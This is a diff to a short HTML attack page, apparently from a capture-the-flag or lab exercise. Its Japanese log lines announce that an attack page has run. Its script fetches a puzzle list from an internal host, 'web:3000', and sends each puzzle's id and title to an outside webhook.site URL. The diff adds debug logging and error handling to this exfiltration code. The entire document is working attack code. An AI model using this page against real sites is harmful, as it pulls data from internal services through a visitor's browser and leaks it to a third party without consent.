@@ -2,13 +2,27 @@
 <html>
 <body>
   <script>
+    console.log("🔥 攻撃ページが実行された");
+
     fetch("http://web:3000/puzzles")
-      .then(r => r.json())
+      .then(r => {
+        console.log("📥 /puzzles レスポンス受信");
+        return r.json();
+      })
       .then(puzzles => {
+        console.log("📦 puzzles = ", puzzles);
         puzzles.forEach(p => {
-          fetch("https://webhook.site/00757dd8-0903-4a93-94b1-454f8b6e8fe6?id=" + encodeURIComponent(p.id) + "&title=" + encodeURIComponent(p.title));
+          const url = "https://webhook.site/00757dd8-0903-4a93-94b1-454f8b6e8fe6"
+            + "?id=" + encodeURIComponent(p.id)
+            + "&title=" + encodeURIComponent(p.title);
+          console.log("🚀 Sending to webhook:", url);
+          fetch(url);
         });
+      })
+      .catch(err => {
+        console.error("❌ fetch error:", err);
       });
   </script>
 </body>
 </html>
+
